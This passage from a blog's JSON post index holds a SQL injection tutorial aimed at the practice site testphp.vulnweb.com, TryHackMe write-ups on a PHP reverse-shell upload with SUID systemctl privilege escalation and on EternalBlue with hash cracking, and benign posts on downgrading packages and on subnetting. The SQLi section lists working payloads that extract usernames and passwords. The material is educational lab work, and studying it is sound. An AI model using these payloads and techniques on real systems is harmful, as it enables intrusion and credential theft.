as the error on website when the number of columns are not match.After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total.Scroll down to the bottom, you should see someting different.http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to thehtml document that contained in second, seventh and nineth columns in the table.It means that we can run whatever we want in that areas to extract information from the database. For example lets run version()helper function at second, seventh or nienth column to see version of the server that running the database.http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11After this point of time, all the helper functions are available for you.You can run the following to avoid first part of thesql query to only see your own query by selecting something non existent from the database.http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11Extracting the table namesFirst thing to do is to gather all the table names exists in the database.For MySQl it is information_schema which providesaccess to database metadata.We are going to use methods of that information_schema to enumerate the database. Even though helper function’s syntax or names will vary database to database, there is always a functionality doingthe same thing with for different database.MariaDB [testdb]&gt; SELECT table_name FROM information_schema.tables WHERE table_schema=database();+------------+| table_name |+------------+| users      |+------------+With tables method belongs to information_schema, we can query the table names.Now lets imply this method to the acuart database.http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()Awesome, we got all the table names storing in the acurat db.Extracting the column namesJust like tables, there is also columns method belongs to information_schema.However, to use that target-spesific, firstwe needed to see table names. Otherwise it will bring all the columns exists in the database, such a mess.MariaDB [testdb]&gt; SELECT column_name FROM information_schema.columns WHERE table_name='users';+---------------------+| column_name         |+---------------------+| PersonID            || LastName            || FirstName           || PersonID            || FirstName           || LastName            || USER                || CURRENT_CONNECTIONS || TOTAL_CONNECTIONS   |+---------------------+Now lets imply this method to the acuart database. http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name="users"We now have got all the column names in the ‘users’ table, ‘uname’ and ‘pass’ columns are intresting : )Extracting values from columnsAfter this point, our aim is certain, and simple. We need to get ‘uname’ and ‘pass’ fields in users table.One simple query to get those values, for example just like this.MariaDB [testdb]&gt; SELECT FirstName from users;+-----------+| FirstName |+-----------+| Burak     || Burak2    || Burak3    |+-----------+So lets imply this to acuart.http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat("Username:",uname, " Password:",pass),8,9,10,11 FROM usersCongrats !! we got the username and password fields.Concat methodAs you see above, I used concat for string formatting.Lets see how it is working from our example database.MariaDB [testdb]&gt; SELECT concat("FN:",FirstName, "  LN:",LastName) from users;+-------------------------------------------+| concat("FN:",FirstName, "  LN:",LastName) |+-------------------------------------------+| FN:Burak  LN:Baris                        || FN:Burak2  LN:Baris2                      || FN:Burak3  LN:Baris3                      |+-------------------------------------------+Guess correctionAs you remember, at the Guessing the design heading, we come up with a possible query that runs at the serverjust by observing the behaviour of the web application. After doing more scans in the database, I see that, that guesswe made above, is kind of close to the real design.http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1Gives the same result as:http://testphp.vulnweb.com/listproducts.php?cat=1VULNWEB - ERROR BASED SQLiAs you remember, this is the pseudo code for testphp.vulnweb website.id=request.get('id')query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id#Try:result = db.execute(query)#Except:    #passif result.size()&gt;0:    for i in result:        print(i.title)        print(i.img)        print(i.description)        print(i.author)else:    passI have added those comment lines intentionally.If we had those Try and Except lines, or any other exception handling methodwith another language that is used in the server side code, we could not have see this error message.Spesifically speaking for the pseudo code above, when execute(query) method returns a result to the result variable from database. if result.size()&gt;0 means that, if we have returned something from query, print it,it can be both the intented and expected query result, or in this case an error message. If we had an exception handling, resultvariable would not be declared at all if the query result is not accurate.This is a catastrophic mis-coding for the server, because we can use this error message to extract data from it.Extract value methodAs in the example, database return the unexpected string in error message. That means that, we see what we give in the inputfield.Instead of seeing what we give as a string, it is possible that to return values from database.There is a helper function that we can use, which is ExtractValue().http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))Query will look like this on the server side.SELECT (some unknown column names) FROM listproducts WHERE cat=extractvalue(rand(),concat(1,database()))This time we have returned a function result as an error message and modified the function as we wanted.As you can see from the picure, result of the database() helper function acuart is in the error message.Extract value with subqueryInstead of passing database() function as a second argument for ExtractValue() method, creating subquery with () willallow you to write your own queries.I am assuming that you read the previous chapters and got the table names already for this example.http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))(1’ and 1=1 #) AND (1 ‘ or 1=1 #)We have figured out the existence of the SQLi with 2-1.However this due to the fact that, the code at the backend iswritten in this syntax:query="SELECT * FROM news WHERE id ="+idWhen we make a request to the www.xyz.com/?id=2-1, the server side code interpret and runs query like this:SELECT * FROM news WHERE id = 2-1--Which returns+-----+| 2-1 |+-----+|   1 |+-----+However the code could have  written like this either:id=request.get('id')query="SELECT (some unknown column names) FROM listproducts WHERE cat ='" + id + "'"#ORid=request.get('id')query=f"SELECT (some unknown column names) FROM listproducts WHERE cat  ='{id}'"When this is the case, if you pass 2-1 to the parameter and make the same www.xyz.com/?id=2-1 request,the query would interpreted like the following, because string formatting is different in this case. As we discussed, both '1' and 1 parameters passed to the query will return the same result but '2-1' will not.SELECT * FROM news WHERE id = '2-1'--Which returns+-----+| 2-1 |+-----+| 2-1 |+-----+When this is the case, we need to escape those single quotes which are surrounding the parameter in order to make our own operationson the database. This is where we need to use those 'or 1=1 # or 'and 1=1 #.Let me remind you the discipline we should follow1-Declare a reference point2-Try to get back there with an unexpected behaviorLets use ' and 1=1 # to make the request like this www.xyz.com/?id=1' and1=1 #.query=f"SELECT * FROM news WHERE id ='{1' and 1=1 #}'"SELECT - FROM new WHERE id = '1' and 1=1This will bring entries which have id of 1, and means that web application vulnerable to SQLi, from now on you can do everything same as beforeto extract data the database.VULNWEB - BLIND SQLiAs you remember this was the pseudo code for testphp.vulnweb.id=request.get('id')query="SELECT (some unknown column names) FROM listproducts WHERE cat="+idresult = db.execute(query)if result.size()&gt;0:    for i in result:        print(i.title)        print(i.img)        print(i.description)        print(i.author)else:    passLets make some changes to think what would have happened if source code for testphp.vulnweb would be like following.id=request.get('id')query="SELECT (some unknown column names) FROM listproducts WHERE cat="+idtry:    result = db.execute(query)except:    print("Error !!!")if result.size()&gt;0:    #for i in result:    #    print(i.title)    #    print(i.img)    #    print(i.description)    #    print(i.author)    print("Query succesfull !")else:    passIf this was the case, we could not see any result of the query on the screen, neitherimages nor titles etc. Also can not perform error based sqli due to exception handling added.How we can extract any data, even make sure there is a sql injection vulnerability when our eyes are blind ?To be continued",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/10/13/sql-injection/'> <img src='/assets/img/posts/fundamentals-of-sql-injection/sql2.jpg' alt='SQL Injection'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>29 min read <time class='article__date' datetime='2021-10-13T12:00:00+01:00'>Oct 13, 2021</time> </span> </div><h2 class='article__title'>SQL Injection</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/sql' class='article__tag'>sql</a>  <a href='/tag/sql-injection' class='article__tag'>sql-injection</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Downgrading Broken Packages",
      "category" : "",
      "tags"     : "arch-linux and package-managers",
      "url"      : "/2021/10/12/downgrading-broken-packages/",
      "date"     : "Oct 12, 2021",
      "content"  : "It is a small possibility, but not impossible, that you may have encounteredwith a broken package after updating your system, while using rolling releaseoperating system. Packages pushed into the repositories without going underany superior control. For example, when new version of a package arrives,manjaro checks it in it’s containers, then push them into public repos. Whileit is quite a personal preference which approach is better for you, it is not thesame for each operating system. So if you have a broken package, or you are not justnot comfortable with newer version of the release you may wish to downgrade it. In this post you will learn how to downgrade a package and ignore updates.Download utility called downgrade with your favorite package manager.yay -S downgradeAfter installing it runsudo downgrade cmatrixIt will prompt you to a selection screen between version just like thatAvailable packages (community):   1)  cmatrix    2.0  1  remote+  2)  cmatrix    2.0  2  remote+  3)  cmatrix    2.0  2  /var/cache/pacman/pkgselect a package by number: Select which version of the program you wish to use than press enter.After that step, downgrade utility will ask you to whether you wish toadd that program to ignorepackage list to prevent later updates or not.add cmatrix to IgnorePkg? [y/N]If you press y in this step, the package wont be affected while doingsystem wide updates. However if you wish to change it back and update thesoftware someday, you need to edit /etc/pacman.conf. Go find IgnorePkg=variable, and delete the package name there. You can also add other packages here manually to disable updates for a spesific program.",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/10/12/downgrading-broken-packages/'> <img src='/assets/img/posts/downgrade/dgbanner.png' alt='Downgrading Broken Packages'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>1 min read <time class='article__date' datetime='2021-10-12T00:59:00+01:00'>Oct 12, 2021</time> </span> </div><h2 class='article__title'>Downgrading Broken Packages</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/arch-linux' class='article__tag'>arch-linux</a>  <a href='/tag/package-managers' class='article__tag'>package-managers</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Tryhackme Vulnversity Ctf Writeup",
      "category" : "",
      "tags"     : "ctf, pentesting, linux-privesc, bruteforce, cracking, reverse-shell, php, and shell-injection",
      "url"      : "/2021/10/09/tryhackme-vulnversity-ctf-writeup/",
      "date"     : "Oct 9, 2021",
      "content"  : "Solve Yourself »Vulnversity is a machine that combines reconnaissance, web attack vectors and privilege escalation methods together.1-EnumerationLet’s start with enumerating the host.I will use Network Mapper nmap tool in order to scan and probe opened ports and active services to find my attack vector.            Parameter      Functionality                  -sS      SYN Stealth Scan (Half TCP Connect scan)              -sV      Probe open ports to determine service/version info              -O      Enable OS detection.              -T4      T{0-5} Set scan speed, higher is faster.              -p-      Scan all 65536 ports.              -oN      Outputfile      Full command:nmap {machine IP} -sV -sS -O -T4 -p- -oN vulnversity.nmapTo create our attack vector.If you do your research and investigate whether one of these services have any vulnerabilities or not, you will return to your home empty handed.You can try anonymous login to FTP protocol, or try to make a SSH connection but you would fail just like I did.None of these services have any vulnerabilities that would put us in the target system.Other than that “3333/tcp open  http   Apache httpd 2.4.18 ((Ubuntu))” catches the eye, so lets start to investigate the webpage that the host is running on its port 3333. Fire up your browser and type {machine IP}:3333 to your address bar.You will see the webpage shown above.Nothing suspicious there, so lets start to extract the directories with the help of the gobuster tool.            Parameter      Functionality                  dir -u      URL and the port where web server is running              -w      Wordlist that contains possible directory names      Full command:gobuster dir -u http://{MachineIP}:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtSeclist’s Wordlist Pack » Let’s go for http://[IP]:3333/internal It seems like we’ve find our playground :) Website have got an upload functionality.2-ExploitationFirst thing came into my mind was to upload a php reverse shell, so let’s try it out.PHP Reverse Shell Script » Download the script by using curl.However in order to make it work, we need to make some configurations in the script to make it work. Change $ip to your own machines ip (tryhackme’s vpn tunnel) ,define the port as any random $port.I’ve changed it to the 8888 while it was 1234 by default.Configurations are all done ! Now, it is time for us to upload the reverse shell to the web server. Note:My machine shutted it down while creating this post, so I had to restart it. That is why the ip have changed, don’t worry :)It seems like .php extension is not allowed.However ,php extension is not the only extension that we can use, we have got couple more.You can try all of them manually, but come on, let’s write a python script :))  Download the php bruter script »Run it. .phtml is the working extension. Rename the payload, php_reverse_shell.php into php_reverse_shell.phtml, and than upload it. Now we have successfully injected our reverse shell script.However we also need to listen incoming connections from the server.Therefore we will use Netcat (nc) to listen to the port 8888, which we set in the script before.            Parameter      Functionality                  -n      Do not resolve hostnames via DNS              -l      Bind and listen for incoming connections              -v      Set verbosity level (can be used several times)              -p      Specify source port to use      Full command:nc -nvlp 8888 While listening to port 8888, we need to activate the script that we just uploaded. Visit this URL » http://{machineIP}:3333/internals/uploads, and than click to the reverse php shell script that you have uploaded. Excellent, we are in !3-Flag Capturing and Privilege EseclationNevertheless, this shell is not stable righ now, we need to spawn a python shell.Run those in order:python -c 'import pty;pty.spawn("/bin/bash")'export TERM=xterm 1-User Flag In order to get root flag, we have to escalate our privileges, let’s search for SUID binaries.If you are not familiar with SUID executables, I recommend you to make your research, than come back, but basically, when you executing a SUID file, you are executing it with it’s owner’s permissions.We will use find command to scan for those binaries.            Parameter      Functionality                  /      Search from the root directory              -type f      Only search for files              -user root      Only find the files owned by root              -perm -u=s      Only find the files with SUID bit set              2&gt;/dev/null      Redirect all stderr outputs to device null      Full command:find -type f -user root -perm -u=s 2&gt;/dev/null Some of those binaries have set uid bit by default, however /bin/systemctl should not have that SUID permission by default,so let’s search how we can exploit that.GTFOBins »GTFOBins is a github project, and it is curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.Click the link given above and search fore systemctl. t seems like one way to exploit that SUID set systemctl is creating a temporary service.Since systemctl’s burden is coordinate the services, it makes sense.However we will need to configure that service file.Service fileTF=$(mktemp).serviceecho '[Service]Type=oneshotExecStart=/bin/bash -c "chmod +s /bin/bash"[Install]WantedBy=multi-user.target' &gt; $TF/bin/systemctl link $TF/bin/systemctl enable --now $TFI have manually changed the systemctl location in the given code from relative to static directory,and also ExecStart will set SUID perm to /bin/bash.Copy and paste the lines given above to shell (Press enter two times after you paste it), and than check the /bin/bash’s file permissions. As you can see, /bin/bash binary now have ‘s’ permission, which indicates that it is a SUID executable.Run:bash -p2-Root Flag As you can see euid (Effective user id) set to 0 which belongs to root.Now you can get the root flag.That is all for this machine, thank you for reading :)",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/10/09/tryhackme-vulnversity-ctf-writeup/'> <img src='/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vulnbanner.png' alt='Tryhackme Vulnversity Ctf Writeup'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>7 min read <time class='article__date' datetime='2021-10-09T18:04:00+01:00'>Oct 9, 2021</time> </span> </div><h2 class='article__title'>Tryhackme Vulnversity Ctf Writeup</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/ctf' class='article__tag'>ctf</a>  <a href='/tag/pentesting' class='article__tag'>pentesting</a>  <a href='/tag/linux-privesc' class='article__tag'>linux-privesc</a>  <a href='/tag/bruteforce' class='article__tag'>bruteforce</a>  <a href='/tag/cracking' class='article__tag'>cracking</a>  <a href='/tag/reverse-shell' class='article__tag'>reverse-shell</a>  <a href='/tag/php' class='article__tag'>php</a>  <a href='/tag/shell-injection' class='article__tag'>shell-injection</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Subnetting",
      "category" : "",
      "tags"     : "subnetting, switch, and router",
      "url"      : "/2021/10/09/subnetting/",
      "date"     : "Oct 9, 2021",
      "content"  : "author: krygennndate: 2021-11-18 12:00categories: [Blogging, Networking]image:    src: /assets/img/posts/subnetting/subnetting1.jpg    alt: SUBNETTING    width: 800    height: 450WHAT IS SUBNETTING ?As the name suggest, subnetting means dividing a network into sub sub branches. For example, you have a class with 50 students,if you divide them into two groups, you will have two subclasses, 25 students per class. Subetting is just the same however,instead of class, this time it is the network which is going to be divided into smaller chunks.WHY USING SUBNETTING ?Subnets provide efficiency for networks. Imagine you want to send a message to your dear friend Jack, who lives in the flatnext to you. Would you deliver the message to some international package delivery service, or to your local post office ?If you were to hand out your message to international package delivery service, it would take way too long to deliver it fromyou to your dear friend Jack, due to bigger scale regulations, procedures etc. Probably your message will be carried out to somefar located central warehouse to wait for dispersion, and the message you want to send to Jack will need to travel hundreds of more miles. As you can see it is painful and costly.Just like in the example, when we are talking about network, we are actually sending messages to our friends or someone else. It is much more efficient, time and cost-saving way to communicate without roaming through all the routers in companies’network just to reach some node sitting next to us, a co-worker from IT department for example.Instead of having one big network for a company, we can divide the departments into smaller chunks. For instance, one subnet for IT department and one for Human Resources department prevents interference between those two departments. It is not neededboth for them to see each other’s traffic as they are completely different departments.Benefits of using subnets            Network Security andManagement Easiness      Subnetting facilitates network management for network administrators,thus, more detailed traffic control can be implemented. It also reduces the risk of spread by quarantining compromised network sections.              Reduces Traffic Congestion      Subnet Mask guarantees that traffic remains within the assigned subnet.This reduces extensive congestion and diminishes the load on the network. In subnets, less distance needs to be travelled for any data, less likely to lose data.              Improve Speed and Performance      After sending a broadcast message, every device on the network will receive and reply to that message even though the message is not relevant for most of the machines.By doing that, network capacity and bandwidth getting drained.However, with subnets only the relevant machines are in communication.This means performance !      Note: Before moving any further, I highly recommend you to read IPv4 Protocol blogpost first.To be continued",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/10/09/subnetting/'> <img src='/assets/img/posts/subnetting/subnetting1.jpg' alt='Subnetting'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>2 min read <time class='article__date' datetime='2021-10-09T00:59:00+01:00'>Oct 9, 2021</time> </span> </div><h2 class='article__title'>Subnetting</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/subnetting' class='article__tag'>subnetting</a>  <a href='/tag/switch' class='article__tag'>switch</a>  <a href='/tag/router' class='article__tag'>router</a> </span></div></div></div></div></div>"
    } ,
  
    {
      "title"    : "Tryhackme Blue Ctf Writeup",
      "category" : "",
      "tags"     : "ctf, pentesting, metasploit, remote-code-execution, buffer-overflow, and cracking",
      "url"      : "/2021/10/09/tryhackme-blue-ctf-writeup/",
      "date"     : "Oct 9, 2021",
      "content"  : "Solve Yourself »Blue is a machine that specifically designed to cover EternalBlue (CVE-2017-0144), which allows remote attackers to execute arbitrary code via crafted packets, aka “Windows SMB Remote Code Execution Vulnerability.” 1-EnumerationLet us run Network Mapper (nmap) to discover opened ports and services.            Parameter      Functionality                  -sV      Probe open ports to determine service/version info              -sC or –script=default      Performs a script scan using the default set of scripts              -O      Enable OS detection              -T4      T{0-5} Set scan speed, higher is faster              -p-      Scan all 65536 ports      Full command :nmap &lt;machine IP&gt; -sV -sC -O -T4 -p- It seems like plenty of services are enabled in the system.However one of them catches the eye.445 /tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup : WORKGROUP)After went through the web searching phase for that specific service, we got this:CVE-2017-0144 - EternalBlue SMB Remote Code Execution (MS17-010)2-ExploitationLet’s use Metasploit frameworkAnd than use MS17-010Six modules are showed up, two of them are auxiliary modules and the rest are exploiting scripts.In a real-life scenario it is not that obvious that those pre-arranged scripts would work.It is highly possible that target system would crash if you ran any careless exploit to target system or you are not sure host is vulnerable to it. To check this we can run auxiliary module.If you are not familiar with what an auxiliary module is, it is some kind of script that helps us to verify if the target system is vulnerable to our actual exploit or not, without crashing or corrupting the system.More technical description would be as following; An auxiliary module does not execute a payload. It can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.In this case Metasploit database offers us those two auxiliary files, run:use auxiliary/scanner/smb/smb_ms17_010Than set RHOSTS  as IP address of  our target machine, and run it.As you can see, the output tells us the that, Host is likely VULNERABLE to MS17-010 !!! After that point we got our proof that the exploit would work.So let us move to the exploitation phase.Exploit - An exploit module executes a sequence of commands to target a specific vulnerability found in a system or application. An exploit module takes advantage of a vulnerability to provide access to the target system. Exploit modules include buffer overflow, code injection, and web application exploit.Run:use exploit/windows/smb/ms17_010_eternalblueLike the previous auxiliary module, set RHOSTS as our target machine and run it.Congrats !!! You’ve hacked into the machine by using MS17-010 vulnerability.Now we have got our Meterpreter shell which provides additional powerful tools.Now we need to use getsystem command,which is provided by Metasploit’s meterpreter shell, that will use number of different techniques in attempt to gain SYSTEM level priveleges on the remote target. Now, lets list all runnig processes with ps command, we will need to migrate our suspicious process into trusted process to ensure consistency.SearchIndexer.exe seems like a good candidate to migrate our process.So type migrate {PID} to migrate spoolsv.exe, which is our reverse tcp payload.Right now we have %100 access to target system and our session’s persistance is solid, lets move on for crediantels and flags.3-Post Exploitation - Capturing the FlagsJust like the getsystem command, meterpreter provides hashdump command, which brings the system hashes for us.We need to find out what kind of hashes they are. It is easy to tell they are NTLM hashes, because Windows is using NTLM hashes for system as default but for the best practice, lets use a hash analyzer to identify the type, you can use any hash analyzer.As you can see, it is NTLM.So, as we know the hash type, we can move forward for to cracking it.I will use John the Ripper,you can use Hashcat or any other cypher cracking tool.            Parameter      Functionality                  hashes      ASCII Text file, which contains copied hashes.              –wordlist      Location of the wordlist              -format      Hash format      We’ve cracked the first hash.Now type shell to use windows’ shell instead of meterpreter shell and start looking for flags.flag1.txtflag2.txtflag3.txtCongrats! End of the machine.",
      "article"  : "<div class='article col col-4 col-d-6 col-t-12 grid__post animate'> <div class='article__inner'><a class='article__image' href='/2021/10/09/tryhackme-blue-ctf-writeup/'> <img src='/assets/img/posts/tryhackme-blue-ctf-writeup/bluebanner.png' alt='Tryhackme Blue Ctf Writeup'> </a><div class='article__content'> <div class='article__meta'> <span class='article__minutes'>5 min read <time class='article__date' datetime='2021-10-09T00:59:00+01:00'>Oct 9, 2021</time> </span> </div><h2 class='article__title'>Tryhackme Blue Ctf Writeup</h2> <p class='article__excerpt'></p><div class='article__bottom'><div class='article__author'> <a href='/about/' aria-label='Burak Baris'><img class='article__author-image' src='/images/15.jpg' alt='Burak Baris's Picture'></a> </div><div class='article__bottom-meta'><a href='/about/' class='article__author-link'>Burak Baris</a><span> in </span> <span class='article-tags'> <a href='/tag/ctf' class='article__tag'>ctf</a>  <a href='/tag/pentesting' class='article__tag'>pentesting</a>  <a href='/tag/metasploit' class='article__tag'>metasploit</a>  <a href='/tag/remote-code-execution' class='article__tag'>remote-code-execution</a>  <a href='/tag/buffer-overflow' class='article__tag'>buffer-overflow</a>  <a href='/tag/cracking' class='article__tag'>cracking</a> </span></div></div></div></div></div>"
    } 
  
]
